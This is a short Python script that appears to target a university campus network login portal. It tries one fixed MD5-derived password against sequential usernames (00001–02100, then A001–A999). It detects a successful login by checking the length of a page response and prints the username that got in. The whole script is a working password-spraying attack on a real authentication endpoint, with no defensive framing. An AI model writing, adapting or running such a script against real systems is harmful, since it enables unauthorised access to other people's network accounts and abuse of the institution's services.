import requests
import hashlib
class DoClient(object):
    def __init__(self):
        self.headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
        self.session = requests.session()
    def login(self,username,password,
              drop = '0',
              type = '1',
              n = '100'):
        login_url = 'http://210.43.32.30/cgi-bin/do_login'
        response = self.session.get(login_url)

        data = {'username':username,
                'password':password,
                'drop':drop,
                'type':type,
                'n':n}
        self.session.post(login_url,data=data,headers = self.headers)
        re = requests.get("http://www.hist.edu.cn/")
        re.encoding = 'utf-8'
        return (len(str(re.text)))
if __name__ == '__main__':
    username = '00001'
    password = 778899
    password = hashlib.md5(str(password).encode('utf-8')).hexdigest()[8:-8]
    D  = DoClient()
    userint = 1
    key = [100,200,300,400,500,600,700,800,900]
    intstr = D.login(username,password)
    flag = 1
    while (intstr == 267 and userint <= 2100):
        userint = userint + 1
        if flag == 1:
            if userint < 10:
                username = '0000'+ str(userint)
            elif userint < 100:
                username = '000'+ str(userint)
            elif userint < 1000:
                username = '00'+ str(userint)
            elif userint < 10000:
                username = '0'+ str(userint)
        if flag == 1 and userint == 2100:
            flag = 0
            userint = 1
        if flag == 0:
            if userint < 10:
                username = 'A00'+ str(userint)
            elif userint < 100:
                username = 'A0'+ str(userint)
            elif userint < 1000:
                username = 'A'+ str(userint)
            else:
                userint = 2101
        intstr = D.login(username,password)
        for i in key:
            if userint == i:
                print(i)
    print(username)
	#//ConnectionError: ('Connection aborted.', ConnectionAbortedError(10053, '你的主机中的软件中止了一个已建立的连接。', None, 10053, None))
